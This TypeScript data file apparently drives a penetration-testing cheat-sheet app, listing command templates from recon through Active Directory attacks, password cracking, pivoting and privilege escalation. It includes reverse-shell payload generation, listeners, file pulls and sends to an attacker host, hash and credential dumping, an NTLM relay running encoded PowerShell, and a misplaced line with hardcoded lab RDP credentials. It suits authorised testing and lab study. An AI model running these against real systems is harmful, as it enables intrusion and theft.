export interface Tool {
  name: string;
  description: string;
  commands: string[];
  category: string;
}

export const toolCategories = [
  {
    name: "Reconnaissance",
    icon: "Search",
    tools: [
      {
        name: "Whois",
        description: "Domain registration information",
        commands: [
          "whois {domain}",
          "whois {ip}",
          "xfreerdp /v:{ip} /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore +clipboard +dynamic-resolution"
        ]
      },
      {
        name: "DNS Enumeration",
        description: "DNS record lookup and zone transfer",
        commands: [
          "dig {domain} ANY +noall +answer",
          "dig {domain} A",
          "dig {domain} MX",
          "dig {domain} NS",
          "dig {domain} TXT",
          "dig axfr @{ip} {domain}",
          "dnsenum {domain}",
          "host -t ns {domain}"
        ]
      },
      {
        name: "Subdomain Enumeration",
        description: "Find subdomains of target",
        commands: [
          "subfinder -d {domain} -all -silent",
          "assetfinder --subs-only {domain}",
          "amass enum -passive -d {domain}",
          "ffuf -u http://{domain} -H 'Host: FUZZ.{domain}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"
        ]
      },
      {
        name: "Certificate Transparency",
        description: "Search CT logs for domains",
        commands: [
          "curl -s 'https://crt.sh/?q=%25.{domain}&output=json' | jq -r '.[].name_value' | sort -u",
          "certspotter {domain}"
        ]
      }
    ]
  },
  {
    name: "Port Scanning",
    icon: "Network",
    tools: [
      {
        name: "Nmap - Methodology",
        description: "Fast full scan, then deep scan on open ports",
        commands: [
          "nmap -p- --min-rate 10000 -T4 -Pn {ip} -oN allports.txt",
          "nmap -p<ports> -sC -sV -O -Pn {ip} -oA deep",
          "nmap -sU --top-ports 100 -Pn {ip} -oN udp.txt",
          "nmap -p<ports> --script vuln -Pn {ip}",
          "nmap -sn 10.10.10.0/24    # host discovery only"
        ]
      },
      {
        name: "Nmap - Common Scripts",
        description: "Targeted NSE scripts per service",
        commands: [
          "nmap -p445 --script smb-enum-shares,smb-vuln* {ip}",
          "nmap -p80,443 --script http-enum,http-title,http-headers {ip}",
          "nmap -p3389 --script rdp-ntlm-info {ip}",
          "nmap -p161 -sU --script snmp-info {ip}",
          "nmap -p21 --script ftp-anon {ip}"
        ]
      },
      {
        name: "Rustscan",
        description: "Very fast port scanner (pipes into nmap)",
        commands: [
          "rustscan -a {ip} --ulimit 5000",
          "rustscan -a {ip} --range 1-65535 -- -sC -sV -oN deep.txt"
        ]
      },
      {
        name: "Masscan",
        description: "Internet-scale port scanner",
        commands: [
          "sudo masscan {ip} -p1-65535 --rate=1000",
          "sudo masscan 10.10.10.0/24 -p80,443,445,3389 --rate=10000"
        ]
      }
    ]
  },
  {
    name: "SMB / Network Shares",
    icon: "Folder",
    tools: [
      {
        name: "netexec (nxc)",
        description: "Swiss-army knife for SMB/WinRM/LDAP (ex-CrackMapExec)",
        commands: [
          "nxc smb {ip}",
          "nxc smb {ip} -u '' -p '' --shares",
          "nxc smb {ip} -u {user} -p {password} --shares --users --groups --pass-pol",
          "nxc smb {ip} -u '' -p '' --rid-brute",
          "nxc smb {ip} -u {user} -p {password} --sam --lsa",
          "nxc winrm {ip} -u {user} -p {password}",
          "nxc smb 10.10.10.0/24 -u {user} -p {password}"
        ]
      },
      {
        name: "smbclient",
        description: "Access SMB shares",
        commands: [
          "smbclient -N -L //{ip}/",
          "smbclient -N //{ip}/share",
          "smbclient //{ip}/share -U {user}",
          "smbclient //{ip}/share -U {user} -c 'recurse ON; ls'"
        ]
      },
      {
        name: "smbmap",
        description: "Enumerate share permissions and contents",
        commands: [
          "smbmap -H {ip}",
          "smbmap -H {ip} -u {user} -p {password} -R",
          "smbmap -H {ip} -u {user} -p {password} --download 'share\\file.txt'"
        ]
      },
      {
        name: "enum4linux-ng",
        description: "Full SMB/RPC/LDAP enumeration",
        commands: [
          "enum4linux-ng -A {ip}",
          "enum4linux-ng -A -u {user} -p {password} {ip}"
        ]
      }
    ]
  },
  {
    name: "Web Enumeration",
    icon: "Globe",
    tools: [
      {
        name: "Feroxbuster",
        description: "Fast recursive content discovery (recommended)",
        commands: [
          "feroxbuster -u http://{domain} -x php,txt,html --scan-limit 4",
          "feroxbuster -u http://{domain} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
        ]
      },
      {
        name: "Ffuf",
        description: "Fast web fuzzer (dirs, vhosts, params)",
        commands: [
          "ffuf -u http://{domain}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt,.bak",
          "ffuf -u http://{domain} -H 'Host: FUZZ.{domain}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0",
          "ffuf -u 'http://{domain}/page?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fc 404",
          "ffuf -u http://{domain}/login -X POST -d 'user=admin&pass=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlist.txt -fr 'Invalid'"
        ]
      },
      {
        name: "Gobuster",
        description: "Directory, DNS and vhost brute-forcing",
        commands: [
          "gobuster dir -u http://{domain} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html",
          "gobuster dns -d {domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
          "gobuster vhost -u http://{domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"
        ]
      },
      {
        name: "whatweb / tech ID",
        description: "Fingerprint the web stack",
        commands: [
          "whatweb -a3 http://{domain}",
          "curl -sI http://{domain}",
          "curl -s http://{domain}/robots.txt"
        ]
      }
    ]
  },
  {
    name: "Vulnerability Scanning",
    icon: "ShieldAlert",
    tools: [
      {
        name: "Nuclei",
        description: "Template-based vulnerability scanner",
        commands: [
          "nuclei -u http://{domain} -severity critical,high",
          "nuclei -u http://{domain} -t http/cves/",
          "nuclei -list urls.txt"
        ]
      },
      {
        name: "Nikto",
        description: "Web server misconfiguration scanner",
        commands: [
          "nikto -h http://{domain}",
          "nikto -h {ip} -p 80,443"
        ]
      },
      {
        name: "WPScan",
        description: "WordPress security scanner",
        commands: [
          "wpscan --url http://{domain} --enumerate u,vp,vt",
          "wpscan --url http://{domain} -U users.txt -P /usr/share/wordlists/rockyou.txt",
          "wpscan --url http://{domain} --api-token YOUR_TOKEN"
        ]
      },
      {
        name: "SQLMap",
        description: "Automatic SQL injection exploitation",
        commands: [
          "sqlmap -u 'http://{domain}/page?id=1' --batch --dbs",
          "sqlmap -u 'http://{domain}/page?id=1' -D db -T users --dump",
          "sqlmap -r request.txt --batch --level 5 --risk 3",
          "sqlmap -r request.txt --os-shell"
        ]
      }
    ]
  },
  {
    name: "Active Directory",
    icon: "Users",
    tools: [
      {
        name: "Kerbrute",
        description: "Kerberos username enum & password spray",
        commands: [
          "kerbrute userenum -d {domain} --dc {ip} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
          "kerbrute passwordspray -d {domain} --dc {ip} users.txt 'Winter2024!'",
          "kerbrute bruteuser -d {domain} --dc {ip} passwords.txt {user}"
        ]
      },
      {
        name: "Impacket - Kerberos",
        description: "AS-REP roast, Kerberoast, ticket abuse",
        commands: [
          "impacket-GetNPUsers {domain}/ -usersfile users.txt -no-pass -dc-ip {ip} -format hashcat",
          "impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {ip} -request",
          "impacket-getTGT {domain}/{user}:{password}",
          "impacket-getST -spn cifs/dc.{domain} -impersonate Administrator {domain}/{user}:{password}"
        ]
      },
      {
        name: "Impacket - Exec & Dump",
        description: "Remote exec, hash dump, DCSync",
        commands: [
          "impacket-psexec {domain}/{user}:{password}@{ip}",
          "impacket-wmiexec {domain}/{user}@{ip} -hashes :{hash}",
          "impacket-secretsdump {domain}/{user}:{password}@{ip}",
          "impacket-secretsdump {domain}/{user}:{password}@{ip} -just-dc",
          "impacket-mssqlclient {domain}/{user}:{password}@{ip} -windows-auth"
        ]
      },
      {
        name: "BloodHound",
        description: "Map AD attack paths",
        commands: [
          "bloodhound-python -u {user} -p {password} -d {domain} -ns {ip} -c All --zip",
          "nxc ldap {ip} -u {user} -p {password} --bloodhound --collection-method All --dns-server {ip}"
        ]
      },
      {
        name: "Evil-WinRM",
        description: "Interactive WinRM shell (pass password or hash)",
        commands: [
          "evil-winrm -i {ip} -u {user} -p {password}",
          "evil-winrm -i {ip} -u {user} -H {hash}",
          "evil-winrm -i {ip} -u {user} -p {password} -s ./scripts/"
        ]
      },
      {
        name: "Certipy (AD CS)",
        description: "Find & abuse vulnerable cert templates",
        commands: [
          "certipy-ad find -u {user}@{domain} -p {password} -dc-ip {ip} -vulnerable -stdout",
          "certipy-ad req -u {user}@{domain} -p {password} -ca CORP-CA -template VulnTemplate -upn administrator@{domain}",
          "certipy-ad auth -pfx administrator.pfx -dc-ip {ip}"
        ]
      },
      {
        name: "ldapsearch",
        description: "Query the DC directly over LDAP",
        commands: [
          "ldapsearch -x -H ldap://{ip} -s base namingcontexts",
          "ldapsearch -x -H ldap://{ip} -D '{user}@{domain}' -w {password} -b 'DC=corp,DC=local'",
          "ldapsearch -x -H ldap://{ip} -D '{user}@{domain}' -w {password} -b 'DC=corp,DC=local' '(servicePrincipalName=*)' sAMAccountName"
        ]
      }
    ]
  },
  {
    name: "Credential Attacks",
    icon: "Key",
    tools: [
      {
        name: "Hydra",
        description: "Online login brute-forcer",
        commands: [
          "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4",
          "hydra -l admin -P passwords.txt ftp://{ip}",
          "hydra -L users.txt -P passwords.txt {ip} http-post-form '/login.php:username=^USER^&password=^PASS^:Invalid'",
          "hydra -L users.txt -P passwords.txt rdp://{ip}"
        ]
      },
      {
        name: "Hashcat",
        description: "GPU password cracker (know your -m mode)",
        commands: [
          "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
          "hashcat -m 1800 shadow.hash rockyou.txt   # sha512crypt",
          "hashcat -m 18200 asrep.hash rockyou.txt   # AS-REP",
          "hashcat -m 13100 kerb.hash rockyou.txt    # Kerberoast",
          "hashcat -m 5600 responder.hash rockyou.txt # NetNTLMv2",
          "hashcat -m 1000 hashes.txt --show"
        ]
      },
      {
        name: "John the Ripper",
        description: "Password cracker + *2john extractors",
        commands: [
          "john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt hashes.txt",
          "unshadow /etc/passwd /etc/shadow > linux.hash && john linux.hash --wordlist=rockyou.txt",
          "ssh2john id_rsa > ssh.hash && john ssh.hash --wordlist=rockyou.txt",
          "zip2john secret.zip > zip.hash && john zip.hash --wordlist=rockyou.txt"
        ]
      },
      {
        name: "Responder",
        description: "LLMNR/NBT-NS poisoning → NetNTLMv2 capture",
        commands: [
          "sudo responder -I tun0 -dwv",
          "sudo responder -I tun0 -A    # analyze mode (passive)",
          "impacket-ntlmrelayx -tf targets.txt -smb2support -c 'powershell -enc <b64>'"
        ]
      },
      {
        name: "CeWL / hash ID",
        description: "Custom wordlists & hash identification",
        commands: [
          "cewl -d 3 -m 5 http://{domain} -w custom.txt",
          "hashid '<hash>'",
          "nth -t '<hash>'"
        ]
      }
    ]
  },
  {
    name: "Pivoting & Tunneling",
    icon: "Share2",
    tools: [
      {
        name: "SSH Tunnels",
        description: "Local, remote and dynamic forwarding",
        commands: [
          "ssh -L 4455:172.16.5.10:445 {user}@{ip}",
          "ssh -R 8000:172.16.5.10:80 kali@YOUR_IP",
          "ssh -fN -D 1080 {user}@{ip}    # SOCKS proxy",
          "sshuttle -r {user}@{ip} 172.16.5.0/24"
        ]
      },
      {
        name: "Chisel",
        description: "Reverse SOCKS/port-forward over HTTP",
        commands: [
          "chisel server -p 8080 --reverse    # on Kali",
          "./chisel client YOUR_IP:8080 R:socks    # on pivot",
          "./chisel client YOUR_IP:8080 R:3389:172.16.5.10:3389"
        ]
      },
      {
        name: "Ligolo-ng",
        description: "Tun-based pivot (no proxychains needed)",
        commands: [
          "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up",
          "./proxy -selfcert    # on Kali",
          "./agent -connect YOUR_IP:11601 -ignore-cert    # on pivot",
          "sudo ip route add 172.16.5.0/24 dev ligolo"
        ]
      },
      {
        name: "Proxychains",
        description: "Route tools through a SOCKS proxy",
        commands: [
          "proxychains4 -q nmap -sT -Pn -n 172.16.5.10",
          "proxychains4 xfreerdp /u:admin /v:172.16.5.10",
          "proxychains4 nxc smb 172.16.5.0/24 -u {user} -p {password}"
        ]
      }
    ]
  },
  {
    name: "File Transfer",
    icon: "Download",
    tools: [
      {
        name: "Serve Files (attacker)",
        description: "Host payloads/loot from your box",
        commands: [
          "python3 -m http.server 80",
          "python3 -m uploadserver 80    # supports uploads",
          "impacket-smbserver share $(pwd) -smb2support",
          "sudo impacket-smbserver share $(pwd) -smb2support -user u -password p"
        ]
      },
      {
        name: "Download (Linux target)",
        description: "Pull files onto a Linux victim",
        commands: [
          "wget http://{ip}/file -O /tmp/file",
          "curl http://{ip}/file -o /tmp/file",
          "nc {ip} 4444 < file    # + nc -lvnp 4444 > file on receiver"
        ]
      },
      {
        name: "Download (Windows target)",
        description: "Pull files onto a Windows victim",
        commands: [
          "powershell -c \"iwr http://{ip}/file.exe -o C:\\Windows\\Temp\\file.exe\"",
          "certutil -urlcache -f http://{ip}/file.exe file.exe",
          "copy \\\\{ip}\\share\\file.exe C:\\Windows\\Temp\\file.exe"
        ]
      }
    ]
  },
  {
    name: "Exploitation & Shells",
    icon: "Zap",
    tools: [
      {
        name: "msfvenom",
        description: "Generate payloads for any platform",
        commands: [
          "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT=4444 -f elf -o shell.elf",
          "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 -f exe -o shell.exe",
          "msfvenom -p php/reverse_php LHOST={ip} LPORT=4444 -f raw -o rev.php",
          "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT=4444 -f war -o shell.war",
          "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT=4444 -f msi -o evil.msi"
        ]
      },
      {
        name: "Listeners",
        description: "Catch the callback",
        commands: [
          "sudo rlwrap -cAr nc -lvnp 4444",
          "pwncat-cs -lp 4444",
          "msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT 4444; run'"
        ]
      },
      {
        name: "SearchSploit",
        description: "Offline Exploit-DB search",
        commands: [
          "searchsploit apache 2.4.49",
          "searchsploit -m 50383    # copy exploit to cwd",
          "searchsploit --nmap deep.xml"
        ]
      },
      {
        name: "TTY Upgrade",
        description: "Turn a dumb shell into a real terminal",
        commands: [
          "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
          "export TERM=xterm-256color",
          "stty raw -echo; fg    # (run on Kali after Ctrl+Z)",
          "stty rows 38 columns 190"
        ]
      }
    ]
  },
  {
    name: "Windows PrivEsc",
    icon: "Terminal",
    tools: [
      {
        name: "Enumeration",
        description: "Find the escalation path",
        commands: [
          "whoami /all",
          "whoami /priv",
          ".\\winPEASx64.exe",
          "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"",
          "systeminfo"
        ]
      },
      {
        name: "Token / Potato",
        description: "Abuse SeImpersonate → SYSTEM",
        commands: [
          ".\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"",
          ".\\PrintSpoofer64.exe -i -c powershell.exe",
          "reg save HKLM\\SAM C:\\Temp\\SAM && reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM"
        ]
      },
      {
        name: "Services & Creds",
        description: "Misconfigured services, stored creds",
        commands: [
          "sc config VulnSvc binPath= \"C:\\Windows\\Temp\\shell.exe\" && sc stop VulnSvc && sc start VulnSvc",
          "cmdkey /list",
          "reg query HKLM /f password /t REG_SZ /s",
          "findstr /si password *.xml *.ini *.txt *.config"
        ]
      }
    ]
  },
  {
    name: "Linux PrivEsc",
    icon: "Terminal",
    tools: [
      {
        name: "Enumeration",
        description: "Automated + manual high-value checks",
        commands: [
          "./linpeas.sh",
          "sudo -l",
          "find / -perm -4000 -type f 2>/dev/null",
          "getcap -r / 2>/dev/null",
          "./pspy64    # watch cron/other-user processes"
        ]
      },
      {
        name: "Common Escalations",
        description: "GTFOBins-style wins",
        commands: [
          "sudo /usr/bin/find . -exec /bin/sh \\; -quit",
          "sudo vim -c ':!/bin/sh'",
          "./bash -p    # if bash is SUID",
          "openssl passwd -1 -salt x pass123    # add root to /etc/passwd"
        ]
      },
      {
        name: "Known CVEs",
        description: "Near-universal on older boxes",
        commands: [
          "pkexec --version    # PwnKit CVE-2021-4034",
          "sudo --version      # Baron Samedit CVE-2021-3156",
          "uname -a && searchsploit linux kernel <ver>"
        ]
      }
    ]
  },
  {
    name: "Remote Access",
    icon: "Monitor",
    tools: [
      {
        name: "XFreeRDP",
        description: "RDP client (password or Pass-the-Hash)",
        commands: [
          "xfreerdp /u:{user} /p:{password} /v:{ip} /cert:ignore /dynamic-resolution",
          "xfreerdp /u:{user} /pth:{hash} /v:{ip} /cert:ignore",
          "xfreerdp /u:{user} /p:{password} /v:{ip} /drive:share,/tmp"
        ]
      },
      {
        name: "Impacket Shells",
        description: "Choose exec method by port/rights",
        commands: [
          "impacket-psexec {domain}/{user}:{password}@{ip}",
          "impacket-wmiexec {domain}/{user}:{password}@{ip}",
          "impacket-atexec {domain}/{user}:{password}@{ip} whoami",
          "impacket-smbexec {domain}/{user}:{password}@{ip}"
        ]
      },
      {
        name: "Pass-the-Hash",
        description: "Authenticate with an NT hash directly",
        commands: [
          "nxc smb {ip} -u {user} -H {hash}",
          "evil-winrm -i {ip} -u {user} -H {hash}",
          "impacket-psexec {domain}/{user}@{ip} -hashes :{hash}"
        ]
      }
    ]
  },
  {
    name: "Information Gathering",
    icon: "Database",
    tools: [
      {
        name: "theHarvester",
        description: "OSINT: emails, subdomains, hosts",
        commands: [
          "theHarvester -d {domain} -b all",
          "theHarvester -d {domain} -b google,bing,crtsh"
        ]
      },
      {
        name: "SNMP",
        description: "Enumerate SNMP (UDP 161)",
        commands: [
          "snmpwalk -v2c -c public {ip}",
          "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {ip}",
          "snmpbulkwalk -v2c -c public {ip} 1.3.6.1.2.1.25.4.2.1.2"
        ]
      },
      {
        name: "Wayback / URLs",
        description: "Historical endpoints & parameters",
        commands: [
          "waybackurls {domain} | tee urls.txt",
          "gau {domain}",
          "curl -s 'http://web.archive.org/cdx/search/cdx?url={domain}/*&output=text&fl=original&collapse=urlkey'"
        ]
      }
    ]
  }
];
